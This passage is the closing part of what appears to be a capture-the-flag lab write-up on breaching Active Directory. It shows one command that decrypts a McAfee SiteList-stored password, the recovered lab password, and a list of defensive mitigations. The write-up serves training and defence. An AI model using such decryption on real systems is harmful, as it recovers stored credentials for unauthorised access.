python3 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

We can see this output:

![Pasted image 20250526153507.png](../../../IMAGES/Pasted%20image%2020250526153507.png)

We got our password:

```
MyStrongPassword!
```

![Pasted image 20250526153536.png](../../../IMAGES/Pasted%20image%2020250526153536.png)

# Conclusion

---

A significant amount of attack avenues can be followed to breach AD. We covered some of those commonly seen being used during a red team exercise in this network. Due to the sheer size of the attack surface, new avenues to recover that first set of AD credentials are constantly being discovered. Building a proper enumeration methodology and continuously updating it will be required to find that initial pair of credentials.

## Mitigations 

In terms of mitigations, there are some steps that organisations can take:

- User awareness and training - The weakest link in the cybersecurity chain is almost always users. Training users and making them aware that they should be careful about disclosing sensitive information such as credentials and not trust suspicious emails reduces this attack surface.
- Limit the exposure of AD services and applications online - Not all applications must be accessible from the internet, especially those that support NTLM and LDAP authentication. Instead, these applications should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security.
- Enforce Network Access Control (NAC) - NAC can prevent attackers from connecting rogue devices on the network. However, it will require quite a bit of effort since legitimate devices will have to be allowlisted.
- Enforce SMB Signing - By enforcing SMB signing, SMB relay attacks are not possible.
- Follow the principle of least privileges - In most cases, an attacker will be able to recover a set of AD credentials. By following the principle of least privilege, especially for credentials used for services, the risk associated with these credentials being compromised can be significantly reduced.

Now that we have breached AD, the next step is to perform enumeration of AD to gain a better understanding of the domain structure and identify potential misconfigurations that can be exploited. This will be covered in the next room. Remember to clear the DNS configuration!

